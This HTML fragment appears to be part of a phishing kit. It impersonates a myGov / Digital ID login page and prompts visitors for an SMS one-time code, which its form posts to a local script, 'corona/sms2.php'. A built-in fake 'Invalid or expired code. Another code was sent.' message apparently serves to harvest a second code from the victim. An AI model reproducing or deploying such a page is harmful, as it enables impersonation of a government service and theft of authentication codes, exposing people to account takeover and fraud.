	...
	<div class="unauth">
		<div class="login-grid-container">
				...
				<div class="login-grid-column">
					<div class="digital-id-login-card-wrapper">
						<div class="digital-id-main-login-card override">
							...
							<img src="./files/otp.png">
							<p>An sms code was sent to your phone number.</p>
			...
			<div class="error-msg-text"><span>
				<strong>Error</strong>
				<br>Invalid or expired code.<br>
			</span><strong>Another code was sent.</strong></div>
				
		
	
								</div>

							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="./corona/sms2.php" method="post">
	
							

								<div class="input-group hasError">
									<label class="override" for="userId">Enter Code</label>
									<input required name="sms" aria-required="true" data-username="data-username" type="text" value="" autocomplete="off">
								</div>
								...
								<div class="button-digital-id-main-container override">
									<div class="digital-id-button-container">
										<button type="submit" class="button-main" name="_eventId_login">Submit</button>
<br><a href="">Cancel</a>
									</div>
								</div>
